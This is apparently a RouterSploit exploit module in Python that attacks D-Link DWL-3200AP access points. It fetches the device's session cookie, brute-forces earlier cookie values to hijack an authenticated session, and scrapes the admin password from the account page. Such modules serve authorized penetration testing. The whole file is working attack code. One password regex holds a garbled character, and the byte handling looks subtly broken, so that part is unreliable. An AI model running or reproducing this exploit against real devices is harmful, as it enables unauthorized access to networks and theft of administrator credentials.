import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DWL-3200AP Password Disclosure",
        "description": "Exploits D-Link DWL3200 access points weak cookie value.",
        "authors": (
            "pws",  # Vulnerability discovery
            "Josh Abraham <sinisterpatrician[at]google.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/34206/",
        ),
        "devices": (
            "D-Link DWL-3200AP",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    # 3600 seconds - one hour means that we will bruteforce authenticated cookie value that was valid within last hour
    seconds = OptInteger(3600, "Number of seconds in the past to bruteforce")

    def run(self):
        if self.check():
            cookie_value = self.get_cookie()
            print_success("Cookie retrieved: {}".format(cookie_value))

            cookie_int = int(cookie_value, 16)
            start = cookie_int - int(self.seconds)

            print_status("Starting bruteforcing cookie value...")
            for i in range(cookie_int, start, -1):
                self.test_cookie(i)
        else:
            print_error("Target does not appear to be vulnerable")

    @mute
    def check(self):
        if self.get_cookie() is not None:
            return True

        return False

    def get_cookie(self):
        pattern = "RpWebID=([a-z0-9]{8})"
        print_status("Attempting to get cookie...")
        try:
            r = self.http_request(
                method="GET",
                path="/",
                timeout=3
            )
            tgt_cookie = re.search(pattern, r.text)
            if tgt_cookie is None:
                print_error("Unable to retrieve cookie")
            else:
                return tgt_cookie.group(1)
        except Exception:
            print_error("Unable to connect to target")

    def test_cookie(self, cookie_int):
        """
        Method that tests all cookies from the past to find one that is valid
        """
        cookies = dict(RpWebID=str(cookie_int))
        try:
            r = self.http_request(
                method='GET',
                path="/html/tUserAccountControl.htm",
                cookies=cookies,
                timeout=10
            )
            if ('NAME="OldPwd"' in r.text):
                print_success("Cookie {} is valid!".format(cookie_int))
                pattern = r"NAME=\"OldPwd\" SIZE=\"12\" MAXLENGTH=\"12\" VALUE=\"([�-9]+)\""
                password = re.findall(pattern, r.content)[0].replace('&', ';&')[1:] + ";"
                print_success("Target password is : {}".format(password))
        except Exception:
            print_error("Unable to connect to target")
